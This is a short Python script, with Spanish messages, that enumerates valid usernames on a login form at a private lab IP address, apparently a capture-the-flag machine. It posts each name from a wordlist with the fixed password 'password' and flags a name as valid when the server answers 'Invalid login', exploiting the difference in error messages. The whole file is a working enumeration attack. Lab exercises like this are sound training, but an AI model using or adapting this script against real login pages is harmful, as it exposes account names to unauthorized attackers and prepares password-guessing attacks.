#!/usr/bin/python3
from pwn import log
import requests, sys

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <dicccionario>\n")
    sys.exit(1)

target = "http://10.10.11.160:5000/login"

dictionary = open(sys.argv[1])
bar = log.progress("Probando usuario")

for line in dictionary:
    username = line.strip()
    data = {"username": username,"password":"password"}
    request = requests.post(target, data=data)
    bar.status(username)
    response = request.text
    if "Invalid login" in response:
        bar.success(f"El usuario {username} es válido")
